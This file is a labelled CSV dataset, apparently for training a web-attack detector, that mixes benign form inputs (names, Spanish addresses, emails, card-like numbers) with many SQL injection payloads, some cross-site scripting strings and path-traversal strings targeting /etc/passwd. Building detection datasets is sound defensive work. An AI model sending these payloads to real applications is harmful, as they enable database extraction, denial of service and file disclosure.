payload,length,attack_type,label
"-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--",65,sqli,anom
calle capitan palacios 71,25,norm,norm
0671271356251463,16,norm,norm
"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",133,sqli,anom
bain@raullazaro.pm,18,norm,norm
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm",128,sqli,anom
"""</style><img src=x onerror=alert(1)//"">",40,xss,anom
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('zypa'='zypa",222,sqli,anom
mamujar,7,norm,norm
</script></script><<<<script><>>>><<<script>alert(xss)</script>,63,xss,anom
1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#,78,sqli,anom
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",60,sqli,anom
"1%"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""%""=""",121,sqli,anom
"fray bernardino de sahagun, 116 9c",34,norm,norm
8320,4,norm,norm
weinberger@privatebanking.com.nz,32,norm,norm
n89m3nd2,8,norm,norm
1') as nftr where 8825=8825 or (select * from (select(sleep(5)))sddo)#,70,sqli,anom
"-5424')) union all select 8231,8231,8231,8231,8231,8231,8231,8231#",66,sqli,anom
lluv8os4,8,norm,norm
decour raichs,13,norm,norm
4350,4,norm,norm
carmelo,7,norm,norm
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,sqli,anom
piperni,7,norm,norm
"""x""><img onerror=""alert(1)""></picture>",38,xss,anom
3709256796210266,16,norm,norm
carretera 200 hasta km. 1 barra de mio 175,42,norm,norm
clodettes_pierson@repretexbcn.ml,32,norm,norm
jaffrey@telogis.um,18,norm,norm
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",236,sqli,anom
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf",67,sqli,anom
"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",120,sqli,anom
"1'+(select 'gqsk' where 3087=3087 union all select null,null,null,null--",72,sqli,anom
7656,4,norm,norm
"1"";begin user_lock.sleep(5); end",32,sqli,anom
nahiara,7,norm,norm
1;begin dbms_lock.sleep(5); end,31,sqli,anom
5933500742960791,16,norm,norm
"c/ corua, 25, 3h",16,norm,norm
"c/ son toells 110, 9?h",22,norm,norm
"1"") where 9545=9545 and 9198=9198--",35,sqli,anom
8320919959502275,16,norm,norm
borrachero muros,16,norm,norm
25114760w,9,norm,norm
"-9558"" where 7497=7497 or (2539=6484)*6484--",44,sqli,anom
"1%""));select sleep(5)#",22,sqli,anom
"calle republique dominicana, 85",31,norm,norm
23628,5,norm,norm
"1') where 4297=4297 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"calle son pujol des garroves, s/n,",34,norm,norm
"1"")) as qvyu where 5962=5962 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",121,sqli,anom
1)) as bvij where 7913=7913;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,121,sqli,anom
mackenna.papac@interpretacion-diccionario-y-significado-de-los-s,64,norm,norm
"1%'))) and elt(3114=3114,sleep(5))#",35,sqli,anom
eisenberg@muchochinoenchina.mx,30,norm,norm
6212,4,norm,norm
69409914p,9,norm,norm
badolatosa,10,norm,norm
19462,5,norm,norm
7297834291786721,16,norm,norm
ataz crehuet,12,norm,norm
"-1526')) or elt(1032=1032,3623) and (('xpob'='xpob",50,sqli,anom
2253152365761758,16,norm,norm
1')) rlike (select * from (select(sleep(5)))sgvo) and (('pemj'='pemj,68,sqli,anom
8045891356356688,16,norm,norm
84740483l,9,norm,norm
linero-noro@cocheacoche.uy,26,norm,norm
jabes,5,norm,norm
"c/ gregal 56, 12?g",18,norm,norm
6529215202550061,16,norm,norm
1%';begin dbms_lock.sleep(5); end and '%'=',43,sqli,anom
repulsivo,9,norm,norm
"tratado de niza, 96",19,norm,norm
557ni03r5o,10,norm,norm
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli,anom
1';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,96,sqli,anom
champ,5,norm,norm
"-5360' where 8178=8178 union all select 8178,8178,8178--",56,sqli,anom
"1) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli,anom
walborn@19horas.cat,19,norm,norm
dans,4,norm,norm
raju,4,norm,norm
valdeprados,11,norm,norm
"1%') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli,anom
bic9spide,9,norm,norm
baggott@lamola-hotel.name,25,norm,norm
"cubo de tierra del vino, el",27,norm,norm
"alams, els",10,norm,norm
2716,4,norm,norm
7583890379589954,16,norm,norm
1') or (select * from (select(sleep(5)))ydpu) and ('dqoz' like 'dqoz,68,sqli,anom
"1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",119,sqli,anom
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",212,sqli,anom
5170755929650123,16,norm,norm
desmerecer,10,norm,norm
1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,70,sqli,anom
"avenida democracia, 106 4?g",27,norm,norm
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni",134,sqli,anom
"1'||(select 'yrau' where 7860=7860 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",144,sqli,anom
"nuestra seora de las angustias s/n,",35,norm,norm
"calle sant marti, 164",21,norm,norm
5349288055787524,16,norm,norm
2865,4,norm,norm
"-5230"") or elt(1032=1032,3623) and (""aivb"" like ""aivb",53,sqli,anom
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rbhe'='rbhe",209,sqli,anom
1))) and (3020=3020)*6703 and (((1233=1233,42,sqli,anom
saree,5,norm,norm
"1%"")) or (select * from (select(sleep(5)))ydpu) and ((""%""=""",59,sqli,anom
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",112,sqli,anom
san juan del monte,18,norm,norm
rull,4,norm,norm
"1%"") and 4595=4595#",19,sqli,anom
coppin@sexl.no,14,norm,norm
ballista@kpincentives.sa,24,norm,norm
56702228y,9,norm,norm
despernada,10,norm,norm
quintn,6,norm,norm
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('jhxh'='jhxh",126,sqli,anom
hilaria,7,norm,norm
476en9o9na5,11,norm,norm
/../../../../../../../../../../../../etc/passwd,47,path-traversal,anom
"1%"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""%""=""",114,sqli,anom
c/ san quintin 104 8-b,22,norm,norm
32648,5,norm,norm
94lp90ulo,9,norm,norm
condal talero,13,norm,norm
"1"") where 9062=9062;select (case when (8916=1357) then 8916 else 8916*(select 8916 from information_schema.character_sets) end)#",128,sqli,anom
1))) and 2006=2006,18,sqli,anom
merendero,9,norm,norm
aceitn,6,norm,norm
6262014386687000,16,norm,norm
37246742j,9,norm,norm
"1"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""vnso"" like ""vnso",126,sqli,anom
pannequin@repretexbcn.gl,24,norm,norm
adelfa,6,norm,norm
marieann,8,norm,norm
cualedro,8,norm,norm
"alonso de mendoza, 31 3b",24,norm,norm
"1"")) as iqgd where 7611=7611 union all select null,null,null,null,null#",71,sqli,anom
/............................{file},35,path-traversal,anom
1')) and 7533=7533 and (('pagc' like 'pagc,42,sqli,anom
"c/ angel ochotorena, 132, 10?b",30,norm,norm
paolo,5,norm,norm
"1'+(select zpns where 6922=6922 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",205,sqli,anom
-1011 or 7140=9977--,20,sqli,anom
"1"" and 8594=(select 8594 from pg_sleep(5))--",44,sqli,anom
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""cdai""=""cdai",77,sqli,anom
suau,4,norm,norm
"-6580') union all select 9950,9950,9950,9950,9950,9950--",56,sqli,anom
"1',(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",202,sqli,anom
"c/ antonio gonzalez suarez, 44, 11?c",36,norm,norm
"1""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,sqli,anom
con2e5u934e1215e,16,norm,norm
"1') as ccee where 8880=8880 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",84,sqli,anom
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""=""",108,sqli,anom
04492457m,9,norm,norm
"calle virgen de la fuensanta, 50 3?b",36,norm,norm
auria,5,norm,norm
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",95,sqli,anom
/0x2e0x2e/0x2e0x2e/0x2e0x2e/{file},34,path-traversal,anom
22001,5,norm,norm
"gravina, 78",11,norm,norm
hoehn,5,norm,norm
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",104,sqli,anom
mio odena,9,norm,norm
9832,4,norm,norm
"1'+(select llcl where 8188=8188 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",184,sqli,anom
"plaza de la sevillana, 81, 5-e",30,norm,norm
radresa aja,11,norm,norm
"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",77,sqli,anom
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../{file},328,path-traversal,anom
207,3,norm,norm
"c/ sicilia, 162,",16,norm,norm
nickie,6,norm,norm
pittner,7,norm,norm
xaubet sorolla,14,norm,norm
"robledo, el",11,norm,norm
"1 where 8908=8908 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",119,sqli,anom
-2781))) or 2573=5848--,23,sqli,anom
42782721f,9,norm,norm
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('rxxb'='rxxb",151,sqli,anom
"alcalde baeza medina, s/n,",26,norm,norm
makeda,6,norm,norm
alargamiento,12,norm,norm
"-5637%""))) or 6872=6872 and (((""%""=""",36,sqli,anom
"travesia doctor sanchez, 139, 12?h",34,norm,norm
1) where 9552=9552 and 1961=6333--,34,sqli,anom
1')) as pgif where 6346=6346;if(7899=7899) select 7899 else drop function zbbp--,80,sqli,anom
"plaa carles ibaez 48, 6?g",25,norm,norm
mame,4,norm,norm
97176413x,9,norm,norm
36930027p,9,norm,norm
colmada43n24,12,norm,norm
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'vvkl'='vvkl",110,sqli,anom
p81i4uer3o,10,norm,norm
"calle sanchez guerrero, 63, 10?h",32,norm,norm
17405,5,norm,norm
"passatge leon, 93 8?a",21,norm,norm
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('cenk'='cenk",133,sqli,anom
valadao@salaparis.ls,20,norm,norm
"1,(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",224,sqli,anom
protectorio,11,norm,norm
"c/ de la villa claudia 44, 4b",29,norm,norm
45221,5,norm,norm
"1"" or (select * from (select(sleep(5)))sddo)#",45,sqli,anom
turcot,6,norm,norm
16851,5,norm,norm
"-1<table background=""javascript:document.cookie=true;"">",55,xss,anom
3491970910096618,16,norm,norm
murdoch,7,norm,norm
"1 union all select null,null,null--",35,sqli,anom
muga sirera,11,norm,norm
"c/ alfara de algimia, 184",25,norm,norm
1%') and (select * from (select(sleep(5)))fzno) and ('%'=',58,sqli,anom
04878,5,norm,norm
"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",42,sqli,anom
mag8,4,norm,norm
mio de san esteban,18,norm,norm
oliver@weat.gm,14,norm,norm
dougall,7,norm,norm
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""krtr"" like ""krtr",195,sqli,anom
"1)) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((9333=9333",124,sqli,anom
"1))) union all select null,null,null,null,null,null,null--",58,sqli,anom
6320,4,norm,norm
0479266564613834,16,norm,norm
dac@eonon.com.cy,16,norm,norm
"<script>alert(""crosssitescripting2"")</script>",45,xss,anom
"1"";select count(*) from generate_series(1,5000000)",50,sqli,anom
mao,3,norm,norm
"1"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
"1';select benchmark(5000000,md5(0x4c4d6142))",44,sqli,anom
rumsey@ubikuo.coop,18,norm,norm
serrano,7,norm,norm
angullo acosta,14,norm,norm
29127,5,norm,norm
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
pato,4,norm,norm
"-8129'))) union all select 4531,4531,4531#",42,sqli,anom
c26ve7sar,9,norm,norm
mitsuter,8,norm,norm
1%')) and (3020=3020)*6703 and (('%'=',38,sqli,anom
struchkova@gestionsoftware.cl,29,norm,norm
"1"");select * from generate_series(9434,9434,case when (9434=3991) then 1 else 0 end) limit 1--",94,sqli,anom
4403,4,norm,norm
1' or 6793=(select 6793 from pg_sleep(5)),41,sqli,anom
"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",87,sqli,anom
amalio,6,norm,norm
82,2,norm,norm
47150,5,norm,norm
-9622'))) order by 1#,21,sqli,anom
portas casola,13,norm,norm
amber,5,norm,norm
"1 where 5925=5925 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
07951538r,9,norm,norm
werkmeister@19horas.zr,22,norm,norm
inviolada,9,norm,norm
"1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,sqli,anom
"1"") as rgbz where 6687=6687 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli,anom
9307824408281680,16,norm,norm
"1)) as somz where 1598=1598;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",118,sqli,anom
"1',(select (case when (1609=1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))",116,sqli,anom
1')) as yefv where 4263=4263;waitfor delay '0:0:5'--,52,sqli,anom
escriva blay,12,norm,norm
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('yxpi'='yxpi,206,sqli,anom
23,2,norm,norm
"avinguda pinyana, 7 2-h",23,norm,norm
44588,5,norm,norm
t1iesti70,9,norm,norm
sherm,5,norm,norm
"1' in boolean mode) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)#",117,sqli,anom
04681808c,9,norm,norm
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
1'))) order by 1--,18,sqli,anom
1'||(select 'ubza' where 2576=2576;select (case when (4341=7041) then 4341 else 4341*(select 4341 from mysql.db) end)#,118,sqli,anom
ab_ogadora,10,norm,norm
telsfora,8,norm,norm
mandruso,8,norm,norm
-8453))) or 3038=3038,21,sqli,anom
lapaza o'neil,13,norm,norm
"1' where 5786=5786 and elt(1210=1210,sleep(5))--",48,sqli,anom
3-e1e5rur3,10,norm,norm
cascabela,9,norm,norm
andries,7,norm,norm
algu chavarri,13,norm,norm
1');select (case when (2968=2021) then 1 else 2968*(select 2968 from master..sysdatabases) end)--,97,sqli,anom
paula,5,norm,norm
6920897670834539,16,norm,norm
